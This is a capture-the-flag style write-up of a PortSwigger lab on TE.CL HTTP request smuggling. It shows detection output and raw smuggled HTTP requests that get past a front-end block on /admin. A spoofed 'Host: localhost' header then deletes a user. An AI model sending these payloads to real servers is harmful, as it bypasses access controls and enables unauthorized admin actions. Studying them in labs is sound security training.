# [Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

## Lab

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

## Detect TE.CL

- burpsuite active scan: detected http request smuggling after 5 minutes
- burpsuite `HTTP request smuggler` extension: detected TE.CL
- smuggler.py: `[tabprefix1]   : Potential TECL Issue Found`

## Analysis

"Path /admin is blocked" by frontend:

  ```http
  GET /admin HTTP/1.1

  HTTP/1.1 403 Forbidden

  "Path /admin is blocked"
  ```

try to smuggling:

- 1:

  ```http
  POST / HTTP/1.1^M$
  Host: 0af90012033ce26cc02e5e0400440053.web-security-academy.net^M$
  Content-Type: application/x-www-form-urlencoded^M$
  Content-Length: 4^M$
  tRANSFER-ENCODING: chunked^M$
  ^M$
  2d^M$
  GET /admin HTTP/1.1^M$
  Content-Length: 80^M$
  ^M$
  x=^M$
  0^M$
  ^M$
  ```

- 2:

  ```http
  GET / HTTP/1.1
  Host: 0af90012033ce26cc02e5e0400440053.web-security-academy.net

  HTTP/1.1 401 Unauthorized

  Admin interface only available to local users
  ```

## Solutions

bypass the `only available to local users` by the `Host: localhost` header.

```http
POST / HTTP/1.1^M$
Host: 0af90012033ce26cc02e5e0400440053.web-security-academy.net^M$
Content-Type: application/x-www-form-urlencoded^M$
Content-Length: 4^M$
tRANSFER-ENCODING: chunked^M$
^M$
55^M$
GET /admin/delete?username=carlos HTTP/1.1^M$
Host: localhost^M$
Content-Length: 80^M$
^M$
x=^M$
0^M$
^M$
```

```http
GET / HTTP/1.1^M$
Host: 0af90012033ce26cc02e5e0400440053.web-security-academy.net^M$
^M$
```
